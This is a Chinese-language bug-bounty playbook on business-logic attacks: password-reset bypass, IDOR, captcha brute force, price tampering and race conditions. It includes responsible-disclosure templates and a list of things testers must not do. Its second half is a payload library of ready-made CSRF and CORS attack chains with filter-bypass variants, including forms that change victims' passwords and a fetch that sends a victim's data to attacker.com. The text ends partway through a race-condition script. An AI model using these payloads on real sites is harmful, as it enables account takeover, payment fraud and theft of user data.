# 业务逻辑 / 越权 / 验证码 / 支付篡改

> 视角：黑盒，关注流程、状态机、不变量

## 1. 一句话说清

逻辑漏洞 = 程序按预期工作，但**预期不对**。
不是注入、不是 RCE，没有"特定 payload"，靠的是**流程理解 + 篡改 + 重放**。
SRC 价值：**很难被 WAF 检测**，公司大厂常因业务复杂而暴露。

---

## 2. 高频入口点（按 WooYun 8,292 案例归类）

| 类型 | 入口特征 | 关键参数 |
|------|---------|---------|
| 密码重置 | `/reset`、`/forgot`、`/findpwd`、`/sms` | `phone`、`username`、`code`、`token`、`step` |
| 越权 | `/user/{id}`、`/order/{id}` | `id`、`uid`、`oid`、`addrid`、`hotelid` |
| 角色 / 提权 | `/role`、`/permission`、`/profile` | `role`、`aid`、`isAdmin`、`level` |
| 支付 / 订单 | `/order/create`、`/pay`、`/checkout` | `price`、`amount`、`total`、`count`、`couponCode` |
| 验证码 | `/sendSms`、`/captcha`、`/verify` | `code`、`captcha`、`smsCode` |
| 优惠券 / 积分 | `/coupon`、`/exchange`、`/redeem` | `code`、`couponId`、`points` |

---

## 3. 探测手法（按子类分）

### 3.1 密码重置 4 模式（来自 wooyun 22 案例）

#### 模式 A：验证码回显在响应

```http
POST /api/sendSmsCode HTTP/1.1
phone=13888888888

→ 响应：
{"code":0,"data":{"verifyCode":"123456"}}
```

**探针**：抓发送验证码的响应包，搜 `verifyCode`、`smsCode`、`code`、`captcha`。
案例：某停车 APP、某社区平台、某邮箱（wooyun-2015-0134914）。

#### 模式 B：验证码与用户解绑

```
1. 用攻击者自己手机 138xxxx0001 注册，收到 code=123456
2. 对受害者发起重置 phone=victim
3. 提交重置表单 phone=victim, code=123456 → 通过
```

**探针**：让平台给 A 手机发码，然后用 A 收到的码去验证 B 手机。
案例：某记账 APP（影响 8000W 用户）。

#### 模式 C：流程跳跃

正常 4 步：输入账号 → 验证身份 → 重置密码 → 完成。

**探针**：直接 GET / POST 第 3 步页面 URL；或用 Burp 改前端流程状态。

```
1. 走完正常流程一次，记录每一步 URL
2. 直接发起第 3 步请求 / 看到达第 3 步是否需要前置 token
3. 修改前端 DOM：用 F12 把"重置密码"DOM 替换"身份验证"
```

案例：某户外用品商城（wooyun-2014-054890）。

#### 模式 D：凭证参数可控

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
```

**探针**：提交时改请求体里的用户名 / token / userId 字段。
看是否真的把 `victim` 的密码改了（用受害者账号尝试登录新密码）。

### 3.2 越权（IDOR）

#### 水平越权（同级用户）

```http
# A 自己的资源
GET /api/address/edit/?addid=100001

# 改成 B 的
GET /api/address/edit/?addid=100002
```

**探针**：
1. 用账号 A 操作，记下 ID
2. 用账号 B 重发同一请求，把 ID 换成 A 的
3. 200 + 返回 A 的数据 = IDOR

工具：Burp `Autorize` 插件，自动比较两个 session 的响应。

参考案例：wooyun-2015-0119942（某商城 20W+ 用户）、wooyun-2014（一嗨租车 19W 发票）。

#### 垂直越权（普通 → 管理员）

```http
# 普通用户改自己资料
POST /updateUser HTTP/1.1
user.aid=3&user.name=test

# 改成管理员 ID
POST /updateUser HTTP/1.1
user.aid=1&user.name=test
```

**探针**：
1. 注册两个账号：普通 + 管理员（用平台 demo / 自己测）
2. 抓管理员页面的接口
3. 用普通用户 token 直接调
4. 200 + 操作成功 = 提权

枚举角色 ID：通常 `1=超管, 2=管理员, 3=普通用户`。

#### Header / Cookie 注入越权

```
X-User-Role: admin
X-User-Id: 1
X-Original-User: admin
X-Forwarded-User: admin
Cookie: role=admin; isAdmin=1; userId=1
```

某些系统把 Header / Cookie 直接当身份信息——**逐个加上面 header 重发**。

#### IDOR 测试矩阵

| 操作 | 探针 | 风险 |
|------|------|------|
| 读 | 改 ID 查他人资源 | 中 / 高 |
| 改 | 改 ID 改他人资源 | 高 |
| 删 | 改 ID 删他人资源 | 严重（不可逆，禁实测删除！） |
| 创建 | 改 owner 字段 | 高 |

### 3.3 验证码绕过（20 案例）

#### 不刷新 / 可重用

```python
# 同一验证码用多次
captcha = "ABCD"
for password in wordlist:
    r = login(username, password, captcha)
    if "success" in r.text: break
```

**探针**：连续登录失败 5 次，验证码图片不变 → 可固定值爆破密码。

#### 4–6 位纯数字 + 无频率限制

```
sms code = 4-6 digit numeric
no throttle
→ Burp Intruder 100 线程爆破
```

参考：某品牌商城 APP 5 位数字验证码 30 秒爆完。

#### 客户端验证 / 响应篡改

```
# 服务端返回
{"status":"0","msg":"验证码错误"}

# 改成
{"status":"1","msg":"成功"}
→ 客户端进入下一步
```

**探针**：在 Burp 拦响应包，把 `0/false/error` 改成 `1/true/success`。
适用：`status` 控制下一步流程的 SPA。

参考案例：健一网 APP（wooyun-2015-0139590）、你我金融。

### 3.4 支付 / 订单（9 案例）

#### 价格篡改

```http
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}

# 原价 299，提交 0.01 → 服务端不重算 → 0.01 元购入
```

**探针清单**（每个值都试）：
```
price = 0
price = 0.01
price = -100
price = 1e-10
price = "0.01"      # 字符串
price = null
price = {"$gt":0}   # MongoDB 注入
price = [299,0.01]  # 数组
```

#### 数量篡改

```
count = -1            # 负数 → 退款逻辑被反向触发
count = 0             # 免费下单
count = 9999999999    # 整数溢出
```

#### 优惠券滥用 / 撤销

```
1. 下满减组合订单（A 商品 59 元 + 换购 B 商品 5.9 元）
2. 支付后取消 A 商品
3. 实际以 5.9 元购得原价 21 元的 B
```

#### 重放支付回调

```http
# 三方支付回调
POST /pay/notify
sign=xxx&order_id=123&status=success&amount=100

# 重放同一回调（同 sign）
→ 如果服务端不查询 order 状态，可能多次发货
```

#### 并发竞争

```python
# 同时创建 50 个 0.01 元订单
import threading
def create():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create) for _ in range(50)]
[t.start() for t in threads]
```

#### 参数污染

```
POST /order/create?price=299.00&price=0.01
POST /order/create  body: price[]=299.00&price[]=0.01
```

参考案例：wooyun-2015-0108817（某电商价格篡改）、中国才储、春趣商城。

### 3.5 竞态条件（race）

| 场景 | 探针 |
|------|------|
| 优惠券双花 | 并发 50 次同一 coupon code |
| 余额超扣 | 并发提现 / 转账，初始余额 100，每次提 100 |
| 邀请奖励刷量 | 并发注册新用户 + 邀请码 |
| 验证码爆破 | 并发提交不同 code |
| 限购抢购 | 并发下单 |
| 唯一性破坏 | 并发注册同一用户名（`existsByUsername` 之后再 insert，竞态可双注册） |

工具：
- Burp Suite Intruder（"Send N requests in parallel"）
- Turbo Intruder（精确并发）
- 自写 Python `threading` / Go goroutine

参考：详见 `playbooks/race-conditions.md`。

---

## 4. Bypass 矩阵

| 拦截 | 绕过 |
|------|------|
| 单 IP 频率限制 | 多 IP / 代理池 / X-Forwarded-For 注入 |
| 同一手机号频率 | 在号码后加点（`13888888888.`、`+8613888888888`、`013888888888`） |
| 验证码图形 | 调验证码识别 API（仅自测合规情况下） |
| 同一账号操作 | 注册多账号轮询 |
| 时间限制 | 改 `Date` Header（少数系统采信） / 调时区参数 |
| Token 一次性 | 抓发包前后 token，看是否真的失效 |

---

## 5. 利用提权 / 横向

| 起点 | 终点 |
|------|------|
| 密码重置漏洞 | 接管所有用户（H1 中位 $2k–$10k） |
| 水平 IDOR 大数据 | PII 泄露（每条 PII = $1–$5 黑市价） |
| 垂直 IDOR | 提权到管理员 → 后台所有功能 → P0 |
| 支付 0.01 元 | 实物商品 / 会员服务 / 虚拟币 |
| 验证码爆破 | 任意账号接管 |
| 重放回调 | 多次发货 / 多次充值 |
| 竞态优惠券 | 反复使用同一优惠 |

---

## 6. 真实案例指纹

| 漏洞类型 | wooyun ID / 案例 | 指纹 / 一句话 |
|---------|----------------|------------|
| 验证码回显 | 某停车 APP wooyun-2015-0134914 | 响应包含 `verifyCode` / `smsCode` |
| 重置流程跳过 | 某户外用品商城 wooyun-2014-054890 | 直接访问第 3 步 URL 不验证前置 |
| 水平越权 | 某成人用品商城 wooyun-2015-0119942 | `?id=` 改成他人 ID 200 |
| 垂直越权 | 浙江在线 wooyun-2015-099378 | `user.aid=1` 提权超管 |
| 金额篡改 | 中国才储 wooyun-2012-07745 | `price=0.01` 通过支付 |
| 价格参数 | 某电商 wooyun-2015-0108817 | 客户端提交 price，服务端不重算 |
| 撞库 | 某手机厂商论坛 wooyun-2014-061871 | 8W 弱口令，无频率限制 |
| Cookie 伪造 | 福建网龙 wooyun-2015-0157092 | `?userAccount=admin` 直接写 Cookie |
| 响应篡改 | 健一网 wooyun-2015-0139590 | 改返回 `status=1` 进入下一步 |

---

## 7. 复现 / 证据要点

### 7.1 IDOR 报告必备

1. 两个账号：A（攻击者）+ B（受害者，**实际为研究员的另一个测试账号**）
2. A 的合法请求包 + 200
3. A 改成 B 的 ID 的请求包 + 200 + 含 B 的数据
4. 如果用真实第三方账号测试到了，**立即停止 + 不在报告中放任何真实数据 + 主动声明**

### 7.2 越权 PoC 模板

```markdown
# 复现步骤

## 账号准备
- 账号 A：用户名 hunter_a，user_id=10001（攻击者控制）
- 账号 B：用户名 hunter_b，user_id=10002（攻击者控制，仅用于证明 IDOR）

## Step 1：A 查询自己订单（基线）
GET /api/orders/100  Authorization: A_token  → 200，返回 A 的订单
（请求/响应见附件 1）

## Step 2：A 查询 B 的订单（漏洞证明）
GET /api/orders/200  Authorization: A_token  → 200，返回 B 的订单内容
（请求/响应见附件 2）

## Step 3：用 C（陌生 user_id=99999）证明非测试账号也可遍历
GET /api/orders/99999  Authorization: A_token  → 200，含订单号、收货人、电话（已脱敏）
仅取 1 条样本，未尝试遍历更多。
```

### 7.3 价格篡改 PoC 模板

```
1. 商品页：299 元
2. 提交订单时改 price=0.01：
   POST /order/create
   {"productId":"X","quantity":1,"price":0.01}
3. 服务端响应订单总额 = 0.01 元
4. 实际支付页面也是 0.01 元（截图 + 支付平台订单截图）
5. 收到商品 / 服务（如果是数字商品则看激活页面）
```

### 7.4 CVSS 参考

```
垂直越权 → 提权 admin     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
水平越权 → 读他人 PII     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5
密码重置接管             CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
价格篡改 0.01            CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5（按业务影响升降）
验证码爆破登录           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
```

### 7.5 影响段（强调业务影响）

```
本漏洞允许任意普通用户通过修改 user_id 参数读取/修改他人订单数据。
对平台业务的实际影响：
1. 用户 PII 泄露：订单含姓名、收货地址、电话、邮箱（GDPR/CCPA 风险）；
2. 商业秘密：订单金额、商品偏好等用户画像数据；
3. 信任损害：被恶意修改地址可导致物流诈骗。

测试时使用了攻击者控制的两个账号 A、B，未访问任何真实用户订单。
仅在最后一步用 1 个随机 ID 证明可遍历性，立即停止并已脱敏。
```

---

## 8. 不要做的事

- **禁**：用支付篡改实际下单实物商品（即使 0.01 元也不行）。改用：
  - 测试环境（如有）
  - 数字商品（电子卡券，支付后立即截图，**不激活**）
  - 演示到"订单生成 + 金额异常"即停，不进入支付链路
- **禁**：批量 IDOR 拖库。最多 1–3 条样本，且全部脱敏。
- **禁**：用密码重置漏洞重置真实用户密码。重置自己的两个测试账号即可。
- **禁**：用越权账号执行写 / 删 / 改操作。只读证明。
- **禁**：撞库使用 SRC 平台之外的真实数据库（违反法律）。
- **禁**：竞态测试发起 1000+ rps（视为 DoS）。控制 50–100 并发即可证明。
- **报告中不要包含**：他人 PII 原文、订单号、手机号、地址（一律脱敏到只剩前 2 + 后 2 字符）。

## H1 真实案例

_从 200+ 份 HackerOne 已披露 High/Critical 报告中按 (赏金 + 投票×100) 排序选取代表案例_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 7500 usd | Valve | [Modify in-flight data to payment provider Smart2Pay](https://hackerone.com/reports/1295844) | I have found vulnerability which allows attacker to generate steam wallet balance |
| Critical | 12000 usd | GitLab | [An attacker can run pipeline jobs as arbitrary user](https://hackerone.com/reports/894569) | Summary An attacker can run arbitrary pipeline jobs as a `victim` user |
| High | — | TikTok | [[CSRF] TikTok Careers Portal Account Takeover](https://hackerone.com/reports/1010522) | [CSRF] TikTok Careers Portal Account Takeover |
| Critical | — | GitLab | [Bypass of GitLab CI runner slash fix in YAML validation](https://hackerone.com/reports/409395) | Hi Gitlab Security, I notice the bug #301432 that Jobert reported earlier is could be bypassed by setting variable in environment |
| High | 3500 usd | GitLab | [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) | Summary When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanit… |
| High | — | pixiv | [Reset any password](https://hackerone.com/reports/703972) | Summary: When I try to reset the password, the verification code of the mailbox is 6 digits, and there is no limit on the numbe… |
| High | — | Reverb.com | [Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247) | Hello team! I've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can eas… |
| High | — | Semrush | [An attacker can buy marketplace articles for lower prices as it allows for negative quantity valu…](https://hackerone.com/reports/771694) | Hi there, When we Summary:** When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attac… |
| Critical | 2000 usd | inDrive | [Change phone number OTP flaw leads to any phone number takeover](https://hackerone.com/reports/2588329) | Summary: Dear Indrive, Ive found another valid report, the app allows any user to change the app phone number, but a flaw withi… |

**命中本类的 weakness 分布：**

- Business Logic Errors：64 条
- Cross-Site Request Forgery (CSRF)：59 条
- Violation of Secure Design Principles：32 条
- Improper Input Validation：21 条
- Improper Restriction of Authentication Attempts：17 条
- Modification of Assumed-Immutable Data (MAID)：9 条
- UI Redressing (Clickjacking)：8 条
- Uncategorized → 手工归类：7 条
- Client-Side Enforcement of Server-Side Security：4 条
- Weak Password Recovery Mechanism for Forgotten Password：4 条
- User Interface (UI) Misrepresentation of Critical Information：2 条
- External Control of Critical State Data：2 条
- Improper Initialization：1 条
- Exposure of Data Element to Wrong Session：1 条
- Encoding Error：1 条
- Improper Check or Handling of Exceptional Conditions：1 条
- Improper Handling of URL Encoding (Hex Encoding)：1 条


## Payload 库

_15 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

**类别分布：** CSRF跨站请求伪造 (8) · 业务逻辑漏洞 (5) · 点击劫持 (2)

### · CSRF跨站请求伪造

### CSRF基础攻击  `csrf-basic`
跨站请求伪造基础攻击技术
子类：**基础攻击** · tags: `csrf` `cross-site` `request` `forgery`

**前置条件：** 目标存在敏感操作；缺少CSRF保护

**攻击链：**

**1. 1. 构造CSRF表单**
_构造自动提交的CSRF表单_
```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

**2. 2. GET请求CSRF**
_GET请求的CSRF攻击_
```
<img src="http://target.com/delete?id=123" style="display:none">
或直接诱导用户点击:
http://target.com/delete?id=123
```

**3. 3. JSON CSRF**
_JSON格式的CSRF攻击_
```
<script>
fetch("http://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**4. 4. 链接诱导**
_诱导用户点击_
```
<a href="http://target.com/action?param=value">点击领取红包</a>
或短链接隐藏真实URL
```

**WAF/EDR 绕过变体：**

**1. Referer绕过**
_绕过Referer检查_
```
使用Referrer Policy:
<meta name="referrer" content="no-referrer">
或使用data URL:
<data:text/html;base64,CSRF_PAYLOAD>
或使用HTTPS->HTTP降级
```

**2. Token绕过**
_绕过Token验证_
```
1. 检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞
```

---

### JSON CSRF攻击  `csrf-json`
针对JSON请求的CSRF攻击技术
子类：**JSON CSRF** · tags: `csrf` `json` `api` `post`

**前置条件：** 目标使用JSON格式请求；缺少CSRF保护；CORS配置不当

**攻击链：**

**1. 1. 简单JSON CSRF**
_使用text/plain绕过预检_
```
<script>
fetch("http://target.com/api/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**2. 2. Flash JSON CSRF**
_使用Flash发送JSON_
```
# 使用Flash发送JSON请求
# 需要目标允许Content-Type: application/json
# 配合Flash的跨域能力
```

**3. 3. XSSI攻击**
_跨站脚本包含攻击_
```
# 利用JSONP回调
<script src="http://target.com/api/data?callback=attacker"></script>
function attacker(data) { console.log(data); }

# 利用数组返回
[{"secret": "data"}]
<script>var data = [{"secret": "data"}];</script>
```

**4. 4. SWF文件攻击**
_使用SWF文件_
```
# 创建恶意SWF文件发送JSON请求
# 编译ActionScript代码
# 嵌入HTML页面
```

**WAF/EDR 绕过变体：**

**1. 修改Content-Type**
_修改Content-Type绕过_
```
# 尝试不同的Content-Type
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
```

**2. 使用FormData**
_使用FormData发送_
```
let formData = new FormData();
formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
fetch(url, {method: "POST", body: formData, credentials: "include"});
```

---

### CSRF绕过技术  `csrf-bypass`
绕过CSRF防护的各种技术
子类：**绕过技术** · tags: `csrf` `bypass` `token` `referer`

**前置条件：** 目标存在CSRF防护；防护机制存在缺陷

**攻击链：**

**1. 1. Token验证绕过**
_绕过Token验证_
```
# Token可预测
分析Token生成规律，预测有效Token

# Token未绑定会话
使用其他用户的Token

# Token重用
同一个Token可多次使用

# Token在GET参数中泄露
从页面源码获取Token
```

**2. 2. Referer验证绕过**
_绕过Referer验证_
```
# 正则匹配不严谨
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# 空Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP不发送Referer
```

**3. 3. Origin验证绕过**
_绕过Origin验证_
```
# Origin为null
使用data URL或about:blank

# 正则绕过
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11不发送Origin
IE11在某些情况下不发送Origin头
```

**4. 4. SameSite绕过**
_绕过SameSite限制_
```
# SameSite=Lax
GET请求会发送Cookie
构造GET形式的敏感操作

# SameSite未设置
默认行为可能允许跨站发送

# 两分钟窗口
SameSite=Lax有2分钟窗口期
```

**WAF/EDR 绕过变体：**

**1. CORS配置错误**
_利用CORS配置错误_
```
# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
允许任意源

# 反射Origin
Access-Control-Allow-Origin: [任意Origin]
```

---

### SameSite绕过技术  `csrf-samesite`
绕过SameSite Cookie属性的CSRF攻击
子类：**SameSite绕过** · tags: `csrf` `samesite` `cookie` `bypass`

**前置条件：** Cookie设置了SameSite属性；SameSite配置存在缺陷

**攻击链：**

**1. 1. SameSite=Lax绕过**
_绕过SameSite=Lax_
```
# GET请求绕过
构造GET形式的敏感操作
<img src="http://target.com/delete?id=123">

# 顶级导航
<a href="http://target.com/action">点击</a>
window.location = "http://target.com/action"

# 两分钟窗口
在用户交互后2分钟内发起请求
```

**2. 2. SameSite=Strict绕过**
_绕过SameSite=Strict_
```
# 子域名攻击
从子域名发起请求
http://sub.target.com/attack

# Cookie覆盖
设置同名Cookie覆盖
Set-Cookie: session=attacker; Domain=.target.com

# 利用重定向
从目标站点重定向到攻击页面
```

**3. 3. 未设置SameSite**
_利用未设置SameSite_
```
# 旧浏览器默认行为
Chrome < 80 默认None
Safari 默认None

# 可直接发起CSRF攻击
无需特殊绕过
```

**4. 4. 利用OAuth流程**
_利用OAuth流程_
```
# OAuth回调绕过SameSite
1. 发起OAuth登录
2. 在回调中注入恶意请求
3. Cookie在OAuth流程中发送
```

**WAF/EDR 绕过变体：**

**1. 混合内容**
_利用混合内容_
```
# HTTPS->HTTP降级
从HTTPS站点发起HTTP请求
某些情况下不发送SameSite
```

**2. 客户端重定向**
_客户端重定向_
```
# JavaScript重定向
location.href = "http://target.com/action"
可能绕过某些SameSite检查
```

---

### Token绕过技术  `csrf-token-bypass`
绕过CSRF Token验证的技术
子类：**Token绕过** · tags: `csrf` `token` `bypass` `predictable`

**前置条件：** 目标使用CSRF Token；Token机制存在缺陷

**攻击链：**

**1. 1. Token可预测**
_预测Token值_
```
# 分析Token生成规律
# 常见弱Token模式:
- 时间戳
- 递增数字
- 用户ID哈希
- 弱随机数

# 预测并构造有效Token
```

**2. 2. Token未绑定会话**
_利用未绑定Token_
```
# Token不验证会话
# 攻击步骤:
1. 攻击者获取自己的Token
2. 使用该Token构造CSRF
3. 诱使受害者提交

# Token可跨用户使用
```

**3. 3. Token泄露**
_利用Token泄露_
```
# Token在URL中泄露
http://target.com/page?token=xxx

# Token在Referer中泄露
从包含Token的页面跳转

# Token在日志中泄露
服务器日志记录Token
```

**4. 4. Token重放**
_Token重放攻击_
```
# Token可重复使用
# 攻击步骤:
1. 获取有效Token
2. 多次使用同一Token
3. Token不过期或不失效
```

**5. 5. Token删除绕过**
_删除Token绕过_
```
# 尝试删除Token参数
POST /action HTTP/1.1
# 不发送Token参数

# 尝试空Token
POST /action?token=

# 尝试删除Token头
```

**WAF/EDR 绕过变体：**

**1. 方法覆盖**
_方法覆盖绕过_
```
# 使用_method参数
POST /action?_method=PUT&token=xxx

# 使用X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
```

**2. JSON格式**
_JSON格式绕过_
```
# 使用JSON格式提交
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# 可能绕过Token验证
```

---

### Referer绕过技术  `csrf-referer-bypass`
绕过Referer验证的CSRF攻击
子类：**Referer绕过** · tags: `csrf` `referer` `bypass` `header`

**前置条件：** 目标验证Referer头；验证逻辑存在缺陷

**攻击链：**

**1. 1. 正则匹配绕过**
_利用正则匹配缺陷_
```
# 正则只检查包含
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# 正则只检查开头
Referer: http://target.com.attacker.com/

# 正则只检查结尾
Referer: http://attacker.com/target.com
```

**2. 2. 空Referer绕过**
_发送空Referer_
```
# 不发送Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP
```

**3. 3. 子域名绕过**
_利用子域名_
```
# 从子域名发起
Referer: http://sub.target.com/attack

# 从兄弟域名发起
Referer: http://sibling.target.com/

# 利用子域名XSS
在子域名注入XSS发起CSRF
```

**4. 4. Referrer-Policy利用**
_利用Referrer-Policy_
```
# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">
```

**WAF/EDR 绕过变体：**

**1. iframe嵌入**
_iframe绕过_
```
# 使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">
```

**2. Flash/SWF**
_Flash控制Referer_
```
# Flash可以控制Referer
# 编译SWF发送自定义Referer
```

---

### Flash CSRF攻击  `csrf-flash`
利用Flash进行CSRF攻击
子类：**Flash CSRF** · tags: `csrf` `flash` `swf` `crossdomain`

**前置条件：** 目标允许Flash请求；crossdomain.xml配置不当

**攻击链：**

**1. 1. crossdomain.xml利用**
_检查跨域策略文件_
```
# 检查crossdomain.xml
http://target.com/crossdomain.xml

# 允许所有域
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

# 允许特定域
<allow-access-from domain="*.target.com"/>
```

**2. 2. 创建恶意SWF**
_创建恶意Flash文件_
```
// ActionScript代码
package {
  import flash.net.*;
  public class CSRF {
    public function CSRF() {
      var req:URLRequest = new URLRequest("http://target.com/api/action");
      req.method = URLRequestMethod.POST;
      req.data = "param=value";
      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
      sendToURL(req);
    }
  }
}
```

**3. 3. 发送JSON请求**
_发送JSON格式请求_
```
// Flash可以发送任意Content-Type
req.requestHeaders.push(
  new URLRequestHeader("Content-Type", "application/json")
);
req.data = JSON.stringify({email: "attacker@evil.com"});
```

**4. 4. 自定义Header**
_添加自定义Header_
```
// Flash可以添加自定义Header
req.requestHeaders.push(
  new URLRequestHeader("X-Custom-Header", "value")
);

// 绕过某些Header验证
```

**WAF/EDR 绕过变体：**

**1. 绕过预检请求**
_绕过CORS预检_
```
# Flash可以绕过CORS预检
# 直接发送POST请求
# 携带Cookie
```

---

### CORS配置错误利用  `csrf-cors`
利用CORS配置错误进行CSRF攻击
子类：**CORS配置错误** · tags: `csrf` `cors` `misconfiguration` `api`

**前置条件：** CORS配置错误；允许跨域携带凭证

**攻击链：**

**1. 1. 检测CORS配置**
_检测CORS配置_
```
# 发送测试请求
curl -H "Origin: http://attacker.com" http://target.com/api

# 检查响应头
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# 危险配置
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**2. 2. 反射Origin攻击**
_利用反射Origin_
```
# 服务器反射任意Origin
Access-Control-Allow-Origin: [请求的Origin]
Access-Control-Allow-Credentials: true

# 攻击代码
fetch("http://target.com/api/sensitive", {
  credentials: "include"
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```

**3. 3. null源攻击**
_利用null源_
```
# 允许null源
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 使用data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>
```

**4. 4. 正则绕过**
_正则匹配绕过_
```
# 正则匹配不严谨
允许: target.com
绕过: attacktarget.com
target.com.attacker.com

# 攻击代码
fetch("http://target.com.api.attacker.com/api", {
  credentials: "include"
});
```

**WAF/EDR 绕过变体：**

**1. 窃取敏感数据**
_窃取用户数据_
```
# 利用CORS窃取数据
fetch("http://target.com/api/user", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));
});
```

**2. 执行敏感操作**
_执行敏感操作_
```
# 利用CORS执行操作
fetch("http://target.com/api/delete", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});
```

---

### · 业务逻辑漏洞

### IDOR越权访问  `biz-idor`
不安全的直接对象引用(IDOR)，通过篡改请求参数中的对象ID越权访问他人数据。攻击者可遍历用户ID、订单号等参数获取未授权资源。
子类：**越权漏洞** · tags: `IDOR` `越权` `业务逻辑` `OWASP` `A01`

**前置条件：** 目标存在基于ID的资源访问接口；已登录普通用户账号

**攻击链：**

**1. 1. 识别可遍历参数**
_识别API中使用数字/UUID作为资源标识符的端点_
```
# 抓取请求中的ID参数
GET /api/users/1001/profile HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 常见IDOR参数：user_id, order_id, file_id, invoice_id, account_id
```

**2. 2. 水平越权测试**
_遍历用户ID参数，观察响应码和大小差异以确认越权_
```
# 用A用户的Token访问B用户的数据
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Authorization: Bearer {TOKEN}" \
    "https://{TARGET}/api/users/$id/profile"
  echo " -> user_id=$id"
done
```

**3. 3. 垂直越权测试**
_尝试以低权限用户调用管理员API或修改自身角色_
```
# 用普通用户Token访问管理员接口
GET /api/admin/users HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 尝试修改角色
PUT /api/users/1001 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"role": "admin", "is_admin": true}
```

**4. 4. 参数污染越权**
_利用参数重复、JSON键覆盖和数组注入绕过IDOR防御_
```
# 双参数污染
GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1

# JSON参数覆盖
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1001, "name": "test", "user_id": 1002}

# 数组注入
GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 编码ID绕过**
_通过编码、负数、溢出等方式绕过ID校验_
```
# Base64编码ID
/api/users/MTAwMQ== (base64 of 1001)
# Hex编码
/api/users/0x3E9
# 负数/溢出
/api/users/-1
/api/users/2147483647
```

---

### 竞态条件攻击  `biz-race-condition`
利用服务端TOCTOU(Time-of-Check to Time-of-Use)漏洞，通过并发请求在检查与执行之间的时间窗口内多次触发同一操作，实现重复领券、重复提现、超额购买等业务逻辑突破。
子类：**竞态条件** · tags: `竞态条件` `Race Condition` `TOCTOU` `并发` `业务逻辑`

**前置条件：** 目标存在余额/积分/优惠券等可量化资源操作；Python/Turbo Intruder环境

**攻击链：**

**1. 1. 识别竞态目标**
_识别涉及资源扣减、限量操作的API端点_
```
# 典型竞态场景：
# 1. 优惠券领取 POST /api/coupon/claim
# 2. 余额提现 POST /api/withdraw
# 3. 积分兑换 POST /api/points/exchange
# 4. 限量商品抢购 POST /api/order/create
# 5. 投票/点赞 POST /api/vote
```

**2. 2. Python并发测试脚本**
_使用Python asyncio并发发送50个相同请求，检测是否能多次领取_
```
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
